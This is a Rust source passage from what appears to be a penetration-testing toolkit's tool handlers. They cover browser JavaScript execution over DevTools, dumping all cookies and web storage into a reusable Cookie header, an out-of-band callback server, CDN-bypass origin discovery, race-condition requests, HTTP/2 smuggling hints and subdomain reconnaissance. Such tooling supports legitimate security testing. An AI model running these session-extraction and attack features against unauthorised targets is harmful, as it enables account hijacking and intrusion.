                    "min_ms": valid_p.iter().copied().fold(f64::INFINITY, f64::min),
                    "max_ms": valid_p.iter().copied().fold(f64::NEG_INFINITY, f64::max),
                    "samples": valid_p.len(),
                    "all_times_ms": probe_times,
                },
                "analysis": {
                    "difference_ms": (diff * 100.0).round() / 100.0,
                    "t_statistic": (t_stat * 1000.0).round() / 1000.0,
                    "significant_at_99_percent": significant,
                    "interpretation": interpretation,
                },
                "config": { "iterations": iterations, "warmup": warmup, "delay_between_ms": delay_ms },
            }))
        }

        // ─── Browser JavaScript Execution — CDP Runtime.evaluate ─────────

        "browser_execute_js" => {
            let code = params["code"].as_str().ok_or("Missing code")?;
            let await_promise = params["await_promise"].as_bool().unwrap_or(true);
            let timeout_ms = params["timeout_ms"].as_u64().unwrap_or(10000);

            // Use dynamic CDP port from browser module
            let cdp_port = crate::browser::get_cdp_port();
            let cdp_url = format!("http://127.0.0.1:{}/json", cdp_port);
            let client = reqwest::Client::new();
            let tabs_resp = client.get(&cdp_url).send().await
                .map_err(|e| format!("Cannot connect to browser CDP on port {}: {}. Launch browser first with browser_navigate action:'open'", cdp_port, e))?;
            let tabs: Vec<serde_json::Value> = tabs_resp.json().await
                .map_err(|e| format!("Failed to parse CDP tabs: {}", e))?;

            let tab_id = params["tab_id"].as_u64();
            let target_tab = if let Some(tid) = tab_id {
                tabs.get(tid as usize).ok_or("Tab ID out of range")?
            } else {
                tabs.iter().find(|t| t["type"].as_str() == Some("page")).ok_or("No page tab found")?
            };

            let ws_url = target_tab["webSocketDebuggerUrl"].as_str()
                .ok_or("No WebSocket debugger URL for tab")?;
            let tab_url = target_tab["url"].as_str().unwrap_or("unknown");
            let tab_title = target_tab["title"].as_str().unwrap_or("unknown");

            // Connect to CDP WebSocket
            let (mut ws_stream, _) = tokio_tungstenite::connect_async(ws_url).await
                .map_err(|e| format!("CDP WebSocket connect failed: {}", e))?;

            use tokio_tungstenite::tungstenite::Message;
            use futures_util::{SinkExt, StreamExt};

            let eval_msg = serde_json::json!({
                "id": 1,
                "method": "Runtime.evaluate",
                "params": {
                    "expression": code,
                    "awaitPromise": await_promise,
                    "returnByValue": true,
                    "timeout": timeout_ms,
                    "userGesture": true,
                }
            });

            ws_stream.send(Message::Text(eval_msg.to_string().into())).await
                .map_err(|e| format!("CDP send failed: {}", e))?;

            // Wait for response
            let result = tokio::time::timeout(
                std::time::Duration::from_millis(timeout_ms + 2000),
                async {
                    while let Some(msg) = ws_stream.next().await {
                        if let Ok(Message::Text(ref text)) = msg {
                            if let Ok(resp) = serde_json::from_str::<serde_json::Value>(&text) {
                                if resp["id"].as_u64() == Some(1) {
                                    return Ok(resp);
                                }
                            }
                        }
                    }
                    Err("CDP connection closed".to_string())
                }
            ).await.map_err(|_| "CDP evaluation timed out".to_string())??;

            let _ = ws_stream.close(None).await;

            let cdp_result = &result["result"]["result"];
            let exception = &result["result"]["exceptionDetails"];

            if exception.is_object() {
                Ok(serde_json::json!({
                    "success": false,
                    "error": exception["text"].as_str().unwrap_or("JavaScript error"),
                    "exception": exception,
                    "tab_url": tab_url,
                    "tab_title": tab_title,
                }))
            } else {
                Ok(serde_json::json!({
                    "success": true,
                    "type": cdp_result["type"].as_str().unwrap_or("undefined"),
                    "value": cdp_result["value"],
                    "description": cdp_result["description"],
                    "tab_url": tab_url,
                    "tab_title": tab_title,
                }))
            }
        }

        // ─── WebSocket Connect — Full WS Lifecycle ───────────────────────

        "websocket_connect" => {
            use futures_util::{SinkExt, StreamExt};
            use tokio_tungstenite::tungstenite::Message;

            let action = params["action"].as_str().unwrap_or("list");

            static WS_CONNECTIONS: std::sync::LazyLock<tokio::sync::Mutex<std::collections::HashMap<String, tokio::sync::mpsc::Sender<String>>>> =
                std::sync::LazyLock::new(|| tokio::sync::Mutex::new(std::collections::HashMap::new()));
            static WS_MESSAGES: std::sync::LazyLock<tokio::sync::Mutex<std::collections::HashMap<String, Vec<String>>>> =
                std::sync::LazyLock::new(|| tokio::sync::Mutex::new(std::collections::HashMap::new()));

            match action {
                "connect" => {
                    let url = params["url"].as_str().ok_or("Missing url for connect")?;
                    let conn_id = format!("ws_{}", chrono::Utc::now().timestamp_millis());

                    let (ws_stream, resp) = tokio_tungstenite::connect_async(url).await
                        .map_err(|e| format!("WebSocket connect failed: {}", e))?;

                    let (mut write, mut read) = ws_stream.split();
                    let (tx, mut rx) = tokio::sync::mpsc::channel::<String>(100);

                    let cid = conn_id.clone();
                    // Sender task
                    tokio::spawn(async move {
                        while let Some(msg) = rx.recv().await {
                            if msg == "__CLOSE__" { let _ = write.close().await; break; }
                            let _ = write.send(Message::Text(msg.into())).await;
                        }
                    });

                    // Reader task
                    let cid2 = conn_id.clone();
                    tokio::spawn(async move {
                        while let Some(Ok(msg)) = read.next().await {
                            let text = match &msg {
                                Message::Text(t) => t.to_string(),
                                Message::Binary(b) => format!("[binary {} bytes] {:?}", b.len(), b),
                                Message::Ping(_) => "[ping]".into(),
                                Message::Pong(_) => "[pong]".into(),
                                Message::Close(_) => { break; }
                                _ => continue,
                            };
                            let mut msgs = WS_MESSAGES.lock().await;
                            msgs.entry(cid2.clone()).or_insert_with(Vec::new).push(text);
                        }
                    });

                    WS_CONNECTIONS.lock().await.insert(conn_id.clone(), tx);
                    WS_MESSAGES.lock().await.insert(conn_id.clone(), Vec::new());

                    Ok(serde_json::json!({
                        "action": "connected",
                        "connection_id": conn_id,
                        "url": url,
                        "status": resp.status().as_u16(),
                    }))
                }
                "send" => {
                    let conn_id = params["connection_id"].as_str().ok_or("Missing connection_id")?;
                    let message = params["message"].as_str().ok_or("Missing message")?;
                    let conns = WS_CONNECTIONS.lock().await;
                    let tx = conns.get(conn_id).ok_or("Connection not found")?;
                    tx.send(message.to_string()).await.map_err(|e| format!("Send failed: {}", e))?;
                    Ok(serde_json::json!({"action": "sent", "connection_id": conn_id, "bytes": message.len()}))
                }
                "receive" => {
                    let conn_id = params["connection_id"].as_str().ok_or("Missing connection_id")?;
                    let timeout = params["receive_timeout_ms"].as_u64().unwrap_or(5000);
                    let max_msgs = params["max_messages"].as_u64().unwrap_or(10) as usize;

                    tokio::time::sleep(std::time::Duration::from_millis(timeout.min(5000))).await;

                    let mut msgs = WS_MESSAGES.lock().await;
                    let messages = msgs.get_mut(conn_id).ok_or("Connection not found")?;
                    let drained: Vec<String> = messages.drain(..).take(max_msgs).collect();
                    Ok(serde_json::json!({"action": "received", "connection_id": conn_id, "count": drained.len(), "messages": drained}))
                }
                "close" => {
                    let conn_id = params["connection_id"].as_str().ok_or("Missing connection_id")?;
                    let mut conns = WS_CONNECTIONS.lock().await;
                    if let Some(tx) = conns.remove(conn_id) {
                        let _ = tx.send("__CLOSE__".into()).await;
                    }
                    WS_MESSAGES.lock().await.remove(conn_id);
                    Ok(serde_json::json!({"action": "closed", "connection_id": conn_id}))
                }
                "list" => {
                    let conns = WS_CONNECTIONS.lock().await;
                    let ids: Vec<&String> = conns.keys().collect();
                    Ok(serde_json::json!({"action": "list", "connections": ids, "count": ids.len()}))
                }
                _ => Err(format!("Unknown websocket_connect action: {}", action)),
            }
        }

        // ─── Session From Browser — CDP Cookie/Storage Extraction ────────

        "session_from_browser" => {
            let domain = params["domain"].as_str();
            let include_ls = params["include_local_storage"].as_bool().unwrap_or(true);
            let include_ss = params["include_session_storage"].as_bool().unwrap_or(true);

            let cdp_port = crate::browser::get_cdp_port();
            let cdp_url = format!("http://127.0.0.1:{}/json", cdp_port);
            let client = reqwest::Client::new();
            let tabs: Vec<serde_json::Value> = client.get(&cdp_url).send().await
                .map_err(|e| format!("Cannot connect to browser CDP on port {}: {}. Launch browser first.", cdp_port, e))?
                .json().await.map_err(|e| format!("Parse CDP tabs: {}", e))?;

            let target_tab = tabs.iter().find(|t| t["type"].as_str() == Some("page"))
                .ok_or("No page tab found")?;

            let ws_url = target_tab["webSocketDebuggerUrl"].as_str().ok_or("No WS debugger URL")?;
            let tab_url = target_tab["url"].as_str().unwrap_or("unknown");

            let (mut ws, _) = tokio_tungstenite::connect_async(ws_url).await
                .map_err(|e| format!("CDP connect: {}", e))?;

            use tokio_tungstenite::tungstenite::Message;
            use futures_util::{SinkExt, StreamExt};

            let mut msg_id = 1u64;

            async fn cdp_call(ws: &mut tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>, id: u64, method: &str, cdp_params: serde_json::Value) -> Result<serde_json::Value, String> {
                use futures_util::{SinkExt, StreamExt};
                use tokio_tungstenite::tungstenite::Message;
                let msg = serde_json::json!({"id": id, "method": method, "params": cdp_params});
                ws.send(Message::Text(msg.to_string().into())).await.map_err(|e| e.to_string())?;
                let timeout = tokio::time::timeout(std::time::Duration::from_secs(5), async {
                    while let Some(Ok(Message::Text(ref text))) = ws.next().await {
                        if let Ok(r) = serde_json::from_str::<serde_json::Value>(&text) {
                            if r["id"].as_u64() == Some(id) { return Ok(r); }
                        }
                    }
                    Err("Connection closed".to_string())
                }).await.map_err(|_| "CDP timeout".to_string())?;
                timeout
            }

            // Get all cookies
            let cookie_result = cdp_call(&mut ws, msg_id, "Network.getAllCookies", serde_json::json!({})).await?;
            msg_id += 1;
            let all_cookies = cookie_result["result"]["cookies"].as_array().cloned().unwrap_or_default();

            // Filter by domain if specified
            let filtered_cookies: Vec<&serde_json::Value> = if let Some(d) = domain {
                all_cookies.iter().filter(|c| {
                    c["domain"].as_str().map_or(false, |cd| cd.contains(d) || d.contains(cd.trim_start_matches('.')))
                }).collect()
            } else {
                all_cookies.iter().collect()
            };

            // Build Cookie header
            let cookie_header: String = filtered_cookies.iter()
                .filter_map(|c| Some(format!("{}={}", c["name"].as_str()?, c["value"].as_str()?)))
                .collect::<Vec<_>>().join("; ");

            // Extract localStorage
            let mut local_storage = serde_json::json!(null);
            if include_ls {
                let ls_result = cdp_call(&mut ws, msg_id, "Runtime.evaluate", serde_json::json!({
                    "expression": "JSON.stringify(Object.fromEntries(Object.entries(localStorage)))",
                    "returnByValue": true
                })).await?;
                msg_id += 1;
                if let Some(val) = ls_result["result"]["result"]["value"].as_str() {
                    local_storage = serde_json::from_str(val).unwrap_or(serde_json::json!({}));
                }
            }

            // Extract sessionStorage
            let mut session_storage = serde_json::json!(null);
            if include_ss {
                let ss_result = cdp_call(&mut ws, msg_id, "Runtime.evaluate", serde_json::json!({
                    "expression": "JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))",
                    "returnByValue": true
                })).await?;
                if let Some(val) = ss_result["result"]["result"]["value"].as_str() {
                    session_storage = serde_json::from_str(val).unwrap_or(serde_json::json!({}));
                }
            }

            let _ = ws.close(None).await;

            // Auto-store in session if requested
            let auto_apply = params["auto_apply"].as_bool().unwrap_or(true);

            Ok(serde_json::json!({
                "tab_url": tab_url,
                "domain_filter": domain,
                "cookies": filtered_cookies,
                "cookie_count": filtered_cookies.len(),
                "cookie_header": cookie_header,
                "local_storage": local_storage,
                "session_storage": session_storage,
                "auto_applied": auto_apply,
                "usage": "Use the 'cookie_header' value in your request headers: Cookie: <value>",
            }))
        }

        // ─── OAST Verify — Self-Testing Callback Server ──────────────────

        "oast_verify" => {
            let action = params["action"].as_str().unwrap_or("self_test");
            let port = params["port"].as_u64().unwrap_or(8888) as u16;

            static OAST_LOG: std::sync::LazyLock<tokio::sync::Mutex<Vec<serde_json::Value>>> =
                std::sync::LazyLock::new(|| tokio::sync::Mutex::new(Vec::new()));
            static OAST_RUNNING: std::sync::LazyLock<std::sync::atomic::AtomicBool> =
                std::sync::LazyLock::new(|| std::sync::atomic::AtomicBool::new(false));

            match action {
                "start_server" | "self_test" => {
                    // Start server if not running
                    if !OAST_RUNNING.load(std::sync::atomic::Ordering::Relaxed) {
                        OAST_RUNNING.store(true, std::sync::atomic::Ordering::Relaxed);
                        let p = port;
                        tokio::spawn(async move {
                            use axum::{routing::any, Router};
                            let app = Router::new().route("/{*path}", any(|
                                req: axum::http::Request<axum::body::Body>,
                            | async move {
                                let method = req.method().to_string();
                                let uri = req.uri().to_string();
                                let headers: std::collections::HashMap<String, String> = req.headers().iter()
                                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string())).collect();
                                let body_bytes = axum::body::to_bytes(req.into_body(), 1048576).await.unwrap_or_default();
                                let body = String::from_utf8_lossy(&body_bytes).to_string();

                                let interaction = serde_json::json!({
                                    "timestamp": chrono::Utc::now().to_rfc3339(),
                                    "method": method,
                                    "uri": uri,
                                    "headers": headers,
                                    "body": body,
                                    "body_size": body_bytes.len(),
                                    "source_type": "http",
                                });
                                OAST_LOG.lock().await.push(interaction);
                                "OK"
                            }));

                            let addr = std::net::SocketAddr::from(([0, 0, 0, 0], p));
                            let listener = tokio::net::TcpListener::bind(addr).await.ok();
                            if let Some(l) = listener {
                                println!("[OAST] Callback server listening on :{}", p);
                                axum::serve(l, app).await.ok();
                            }
                        });

                        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                    }

                    if action == "self_test" {
                        // Send a test request to ourselves
                        let test_id = format!("test_{}", chrono::Utc::now().timestamp_millis());
                        let client = reqwest::Client::new();
                        let test_url = format!("http://127.0.0.1:{}/{}", port, test_id);
                        let _ = client.get(&test_url).header("X-Test", "oast-self-test").send().await;

                        tokio::time::sleep(std::time::Duration::from_millis(200)).await;

                        let log = OAST_LOG.lock().await;
                        let found = log.iter().any(|e| e["uri"].as_str().map_or(false, |u| u.contains(&test_id)));

                        Ok(serde_json::json!({
                            "action": "self_test",
                            "server_running": true,
                            "port": port,
                            "test_url": test_url,
                            "test_id": test_id,
                            "callback_received": found,
                            "status": if found { "WORKING — OAST callback server is operational" } else { "FAILED — callback not received" },
                            "total_interactions": log.len(),
                            "external_url_hint": format!("Use http://<YOUR_IP>:{}/{{correlation_id}} in payloads", port),
                        }))
                    } else {
                        Ok(serde_json::json!({
                            "action": "start_server",
                            "server_running": true,
                            "port": port,
                            "url": format!("http://0.0.0.0:{}", port),
                        }))
                    }
                }
                "get_interactions" => {
                    let log = OAST_LOG.lock().await;
                    let corr_id = params["correlation_id"].as_str();
                    let filtered: Vec<&serde_json::Value> = if let Some(cid) = corr_id {
                        log.iter().filter(|e| e["uri"].as_str().map_or(false, |u| u.contains(cid))).collect()
                    } else {
                        log.iter().collect()
                    };
                    Ok(serde_json::json!({
                        "total": log.len(),
                        "filtered": filtered.len(),
                        "interactions": filtered,
                    }))
                }
                "clear" => {
                    OAST_LOG.lock().await.clear();
                    Ok(serde_json::json!({"action": "clear", "status": "cleared"}))
                }
                _ => Err(format!("Unknown oast_verify action: {}", action)),
            }
        }

        // ─── DNS Resolve — Origin IP Discovery ───────────────────────────

        "dns_resolve" => {
            let domain = params["domain"].as_str().ok_or("Missing domain")?;
            let mut results = Vec::new();

            // A/AAAA records via system resolver
            let lookup_target = format!("{}:443", domain);
            match tokio::net::lookup_host(&lookup_target).await {
                Ok(addrs) => {
                    for addr in addrs {
                        let ip = addr.ip();
                        let record_type = if ip.is_ipv4() { "A" } else { "AAAA" };
                        results.push(serde_json::json!({
                            "type": record_type,
                            "value": ip.to_string(),
                            "port": addr.port(),
                        }));
                    }
                },
                Err(e) => {
                    results.push(serde_json::json!({"error": format!("DNS lookup failed: {}", e)}));
                }
            }

            // Detect CDN
            let ips: Vec<String> = results.iter().filter_map(|r| r["value"].as_str().map(|s| s.to_string())).collect();
            let mut cdn_indicators = Vec::new();

            // Check reverse DNS / IP ranges for known CDNs
            for ip in &ips {
                if let Ok(addr) = ip.parse::<std::net::IpAddr>() {
                    match addr {
                        std::net::IpAddr::V4(v4) => {
                            let octets = v4.octets();
                            // CloudFront ranges (13.x, 52.x, 54.x, 99.x, 143.x, 204.x)
                            if [13, 52, 54, 99, 143, 204].contains(&octets[0]) {
                                cdn_indicators.push(format!("{} → likely CloudFront", ip));
                            }
                            // Cloudflare (104.x, 172.64-71, 162.158, 198.41)
                            if octets[0] == 104 || (octets[0] == 172 && (64..=71).contains(&octets[1])) {
                                cdn_indicators.push(format!("{} → likely Cloudflare", ip));
                            }
                            // Akamai (23.x, 104.x)
                            if octets[0] == 23 || octets[0] == 2 {
                                cdn_indicators.push(format!("{} → possibly Akamai", ip));
                            }
                        },
                        _ => {}
                    }
                }
            }

            // Also try common subdomains for origin discovery
            let mut origin_hints = Vec::new();
            for prefix in &["origin", "direct", "backend", "real", "internal", "origin-www", "app"] {
                let sub = format!("{}.{}:443", prefix, domain);
                let lookup_result = tokio::net::lookup_host(sub.as_str()).await;
                if let Ok(addrs) = lookup_result {
                    let sub_ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect();
                    if !sub_ips.is_empty() {
                        origin_hints.push(serde_json::json!({
                            "subdomain": format!("{}.{}", prefix, domain),
                            "ips": sub_ips,
                        }));
                    }
                }
            }

            Ok(serde_json::json!({
                "domain": domain,
                "records": results,
                "unique_ips": ips,
                "cdn_indicators": cdn_indicators,
                "origin_subdomain_hints": origin_hints,
                "tip": "Use raw_tcp_send with Host header override to test direct-to-origin bypassing CDN edge",
            }))
        }

        // ─── Race Request — Barrier-Synchronized Parallel HTTP ───────────

        "race_request" => {
            use std::sync::Arc;
            use tokio::sync::Barrier;

            let gate_timeout = params["gate_timeout_ms"].as_u64().unwrap_or(5000);

            // Build request list
            let mut requests: Vec<serde_json::Value> = Vec::new();

            if let Some(arr) = params["requests"].as_array() {
                requests = arr.clone();
            }

            // Or use repeat_count + template
            if requests.is_empty() {
                if let (Some(count), Some(template)) = (params["repeat_count"].as_u64(), params["template_request"].as_object()) {
                    for _ in 0..count {
                        requests.push(serde_json::Value::Object(template.clone()));
                    }
                }
            }

            if requests.is_empty() {
                return Err("No requests provided".into());
            }

            let n = requests.len();
            let barrier = Arc::new(Barrier::new(n));
            let start_time = std::time::Instant::now();

            // Pre-open ALL connections before firing
            let mut handles = Vec::new();

            for (idx, req) in requests.into_iter().enumerate() {
                let bar = barrier.clone();
                let method = req["method"].as_str().unwrap_or("GET").to_uppercase();
                let url_str = req["url"].as_str().unwrap_or("").to_string();
                let body = req["body"].as_str().unwrap_or("").to_string();
                let custom_headers: Vec<(String, String)> = req["headers"].as_object()
                    .map(|h| h.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                    .unwrap_or_default();

                let handle = tokio::spawn(async move {
                    // Build client
                    let client = reqwest::Client::builder()
                        .danger_accept_invalid_certs(true)
                        .timeout(std::time::Duration::from_secs(10))
                        .build()
                        .map_err(|e| e.to_string())?;

                    // Pre-build request
                    let m = match method.as_str() {
                        "POST" => reqwest::Method::POST,
                        "PUT" => reqwest::Method::PUT,
                        "DELETE" => reqwest::Method::DELETE,
                        "PATCH" => reqwest::Method::PATCH,
                        _ => reqwest::Method::GET,
                    };
                    let mut rb = client.request(m, &url_str);
                    for (k, v) in &custom_headers {
                        rb = rb.header(k.as_str(), v.as_str());
                    }
                    if !body.is_empty() {
                        rb = rb.body(body);
                    }

                    // ━━━ BARRIER: Wait for ALL requests to be ready ━━━
                    let pre_barrier = std::time::Instant::now();
                    bar.wait().await;
                    let barrier_wait_us = pre_barrier.elapsed().as_micros(); // microsecond precision

                    // ━━━ FIRE! ━━━
                    let fire_time = std::time::Instant::now();
                    let result = rb.send().await;
                    let response_ms = fire_time.elapsed().as_millis();

                    match result {
                        Ok(resp) => {
                            let status = resp.status().as_u16();
                            let headers: Vec<(String, String)> = resp.headers().iter()
                                .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                                .collect();
                            let body_text = resp.text().await.unwrap_or_default();
                            Ok::<serde_json::Value, String>(serde_json::json!({
                                "index": idx,
                                "status": status,
                                "response_ms": response_ms,
                                "barrier_wait_us": barrier_wait_us,
                                "body_length": body_text.len(),
                                "body_preview": &body_text[..body_text.len().min(500)],
                                "response_headers": headers.iter().take(10).map(|(k,v)| format!("{}: {}", k, v)).collect::<Vec<_>>(),
                            }))
                        }
                        Err(e) => Ok(serde_json::json!({
                            "index": idx,
                            "error": e.to_string(),
                            "response_ms": response_ms,
                            "barrier_wait_us": barrier_wait_us,
                        }))
                    }
                });
                handles.push(handle);
            }

            // Wait for all with gate timeout
            let results_raw = tokio::time::timeout(
                std::time::Duration::from_millis(gate_timeout + 15000),
                futures_util::future::join_all(handles)
            ).await.map_err(|_| "Race request timed out")?;

            let mut race_results: Vec<serde_json::Value> = Vec::new();
            for r in results_raw {
                match r {
                    Ok(Ok(v)) => race_results.push(v),
                    Ok(Err(e)) => race_results.push(serde_json::json!({"error": e})),
                    Err(e) => race_results.push(serde_json::json!({"error": e.to_string()})),
                }
            }

            // Analyze timing spread
            let response_times: Vec<u64> = race_results.iter()
                .filter_map(|r| r["response_ms"].as_u64())
                .collect();
            let statuses: Vec<u64> = race_results.iter()
                .filter_map(|r| r["status"].as_u64())
                .collect();
            let min_ms = response_times.iter().copied().min().unwrap_or(0);
            let max_ms = response_times.iter().copied().max().unwrap_or(0);

            Ok(serde_json::json!({
                "total_requests": n,
                "total_ms": start_time.elapsed().as_millis(),
                "timing_spread_ms": max_ms - min_ms,
                "fastest_ms": min_ms,
                "slowest_ms": max_ms,
                "status_codes": statuses,
                "all_same_status": statuses.windows(2).all(|w| w[0] == w[1]),
                "results": race_results,
                "race_indicator": if !statuses.windows(2).all(|w| w[0] == w[1]) {
                    "POSSIBLE RACE — different status codes received"
                } else {
                    "No race detected — all responses identical"
                },
            }))
        }

        // ─── HTTP/2 Support — H2 Detection & Requests ───────────────────

        "h2_detect_support" => {
            let url = params["url"].as_str().ok_or("Missing url")?;

            // Try HTTPS with ALPN negotiation
            let parsed = url::Url::parse(url).map_err(|e| e.to_string())?;
            let host = parsed.host_str().ok_or("No host")?;
            let port = parsed.port().unwrap_or(if parsed.scheme() == "https" { 443 } else { 80 });

            let mut h2_supported = false;
            let mut protocol_version = "unknown".to_string();
            let mut alpn_protocols = Vec::new();

            // Method 1: Check via reqwest (auto-negotiates ALPN)
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            if let Ok(resp) = client.get(url).send().await {
                let version = resp.version();
                protocol_version = format!("{:?}", version);
                h2_supported = version == reqwest::Version::HTTP_2;
            }

            // Method 2: Detect via response headers / server info
            // (native_tls doesn't expose ALPN — reqwest handles it internally)
            if h2_supported {
                alpn_protocols.push("h2".to_string());
            } else {
                alpn_protocols.push("http/1.1".to_string());
            }

            Ok(serde_json::json!({
                "url": url,
                "host": host,
                "port": port,
                "h2_supported": h2_supported,
                "protocol_version": protocol_version,
                "alpn_negotiated": alpn_protocols,
                "h2_smuggling_possible": h2_supported,
                "tip": if h2_supported {
                    "Server supports H2. Use h2_send_request to send H2 requests. For H2.CL smuggling, inject Content-Length in H2 frame headers."
                } else {
                    "Server does NOT support H2. Use raw_tcp_send or smuggling_send with pipeline_mode for H1.1 attacks."
                },
            }))
        }

        "h2_send_request" => {
            let url = params["url"].as_str().ok_or("Missing url")?;
            let method_str = params["method"].as_str().unwrap_or("GET").to_uppercase();
            let body = params["body"].as_str().unwrap_or("");
            let custom_headers = params["headers"].as_object();

            // Use reqwest — it auto-negotiates H2 via ALPN on HTTPS
            // (http2_prior_knowledge requires rustls feature, not available with native-tls)
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(15))
                .build()
                .map_err(|e| e.to_string())?;

            let m = match method_str.as_str() {
                "POST" => reqwest::Method::POST,
                "PUT" => reqwest::Method::PUT,
                "DELETE" => reqwest::Method::DELETE,
                "PATCH" => reqwest::Method::PATCH,
                "HEAD" => reqwest::Method::HEAD,
                "OPTIONS" => reqwest::Method::OPTIONS,
                _ => reqwest::Method::GET,
            };

            let mut rb = client.request(m, url);

            if let Some(hdrs) = custom_headers {
                for (k, v) in hdrs {
                    rb = rb.header(k.as_str(), v.as_str().unwrap_or(""));
                }
            }

            if !body.is_empty() {
                rb = rb.body(body.to_string());
            }

            let start = std::time::Instant::now();
            let resp = rb.send().await.map_err(|e| format!("H2 request failed: {}", e))?;
            let response_ms = start.elapsed().as_millis();

            let version = format!("{:?}", resp.version());
            let status = resp.status().as_u16();
            let resp_headers: Vec<String> = resp.headers().iter()
                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                .collect();
            let resp_body = resp.text().await.unwrap_or_default();

            Ok(serde_json::json!({
                "url": url,
                "method": method_str,
                "protocol": version,
                "status": status,
                "response_ms": response_ms,
                "headers": resp_headers,
                "body_length": resp_body.len(),
                "body_preview": &resp_body[..resp_body.len().min(3000)],
                "is_h2": version.contains("2"),
            }))
        }

        "h2_translate" => {
            let direction = params["direction"].as_str().ok_or("Missing direction")?;
            let method = params["method"].as_str().unwrap_or("GET");
            let url = params["url"].as_str().ok_or("Missing url")?;
            let custom_headers = params["headers"].as_object();
            let body = params["body"].as_str().unwrap_or("");

            let parsed = url::Url::parse(url).unwrap_or_else(|_| url::Url::parse("http://example.com").unwrap());

            match direction {
                "h1_to_h2" => {
                    let mut h2_headers = serde_json::Map::new();
                    h2_headers.insert(":method".to_string(), serde_json::json!(method));
                    h2_headers.insert(":path".to_string(), serde_json::json!(parsed.path()));
                    h2_headers.insert(":authority".to_string(), serde_json::json!(parsed.host_str().unwrap_or("")));
                    h2_headers.insert(":scheme".to_string(), serde_json::json!(parsed.scheme()));

                    // Hop-by-hop headers to remove
                    let hop_by_hop = ["transfer-encoding", "connection", "keep-alive", "upgrade",
                                      "proxy-connection", "proxy-authenticate", "proxy-authorization"];

                    if let Some(hdrs) = custom_headers {
                        for (k, v) in hdrs {
                            let lk = k.to_lowercase();
                            if !hop_by_hop.contains(&lk.as_str()) && !lk.starts_with(':') {
                                h2_headers.insert(k.clone(), v.clone());
                            }
                        }
                    }

                    Ok(serde_json::json!({
                        "direction": "h1_to_h2",
                        "h2_pseudo_headers": {
                            ":method": method,
                            ":path": parsed.path(),
                            ":authority": parsed.host_str().unwrap_or(""),
                            ":scheme": parsed.scheme(),
                        },
                        "h2_headers": h2_headers,
                        "body": body,
                        "removed_hop_by_hop": hop_by_hop,
                        "note": "Use h2_send_request to send this as a real HTTP/2 frame",
                    }))
                }
                "h2_to_h1" => {
                    let mut h1 = format!("{} {} HTTP/1.1\r\nHost: {}\r\n", method, parsed.path(), parsed.host_str().unwrap_or(""));
                    if let Some(hdrs) = custom_headers {
                        for (k, v) in hdrs {
                            if !k.starts_with(':') {
                                h1.push_str(&format!("{}: {}\r\n", k, v.as_str().unwrap_or("")));
                            }
                        }
                    }
                    if !body.is_empty() {
                        h1.push_str(&format!("Content-Length: {}\r\n", body.len()));
                    }
                    h1.push_str("\r\n");
                    if !body.is_empty() {
                        h1.push_str(body);
                    }

                    Ok(serde_json::json!({
                        "direction": "h2_to_h1",
                        "h1_request": h1,
                        "note": "Use raw_tcp_send to send this as raw H1 bytes",
                    }))
                }
                _ => Err(format!("Unknown direction: {}", direction))
            }
        }

        // ─── OSINT Tools (Zero API Keys) ────────────────────────────────

        "crtsh_search" => {
            let domain = params["domain"].as_str().ok_or("Missing domain")?;
            let include_expired = params["include_expired"].as_bool().unwrap_or(false);
            let _resolve_dns = params["resolve_dns"].as_bool().unwrap_or(false);

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(30))
                .build().map_err(|e| e.to_string())?;

            let url = format!("https://crt.sh/?q=%25.{}&output=json", domain);
            let resp = client.get(&url).send().await.map_err(|e| format!("crt.sh request failed: {}", e))?;
            let status = resp.status().as_u16();
            let body = resp.text().await.map_err(|e| e.to_string())?;

            if status != 200 {
                return Ok(serde_json::json!({
                    "error": format!("crt.sh returned status {}", status),
                    "confidence": "informational"
                }));
            }

            let certs: Vec<serde_json::Value> = serde_json::from_str(&body).unwrap_or_default();

            // Extract unique subdomains
            let mut subdomains = std::collections::BTreeSet::new();
            let mut cert_details = Vec::new();
            let now = chrono::Utc::now();

            for cert in &certs {
                let name_value = cert["name_value"].as_str().unwrap_or("");
                let not_after = cert["not_after"].as_str().unwrap_or("");
                let issuer = cert["issuer_name"].as_str().unwrap_or("");

                // Check expiration
                if !include_expired {
                    if let Ok(expiry) = chrono::NaiveDateTime::parse_from_str(not_after, "%Y-%m-%dT%H:%M:%S") {
                        if expiry < now.naive_utc() { continue; }
                    }
                }

                // Extract subdomains from name_value (can contain multiple \n-separated entries)
                for name in name_value.split('\n') {
                    let name = name.trim().to_lowercase();
                    if name.contains(&format!(".{}", domain.to_lowercase())) || name == domain.to_lowercase() {
                        let clean = name.replace("*.", "");
                        subdomains.insert(clean);
                    }
                }

                if cert_details.len() < 20 {
                    cert_details.push(serde_json::json!({
                        "common_name": cert["common_name"].as_str().unwrap_or(""),
                        "name_value": name_value,
                        "issuer": issuer,
                        "not_before": cert["not_before"].as_str().unwrap_or(""),
                        "not_after": not_after,
                        "serial": cert["serial_number"].as_str().unwrap_or(""),
                    }));
                }
            }

            let subdomain_list: Vec<String> = subdomains.into_iter().collect();

            Ok(serde_json::json!({
                "domain": domain,
                "subdomains": subdomain_list,
                "subdomain_count": subdomain_list.len(),
                "certificates_sampled": cert_details,
                "total_certificates": certs.len(),
                "confidence": "informational",
                "source": "crt.sh (Certificate Transparency)",
                "note": "These are subdomains found in CT logs. They may or may not be currently active. Use dns_resolve to verify."
            }))
        }

        "wayback_lookup" => {
            let domain = params["domain"].as_str().ok_or("Missing domain")?;
            let match_type = params["match_type"].as_str().unwrap_or("domain");
            let filter_interesting = params["filter_interesting"].as_bool().unwrap_or(true);
            let limit = params["limit"].as_u64().unwrap_or(500) as usize;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(30))
                .build().map_err(|e| e.to_string())?;

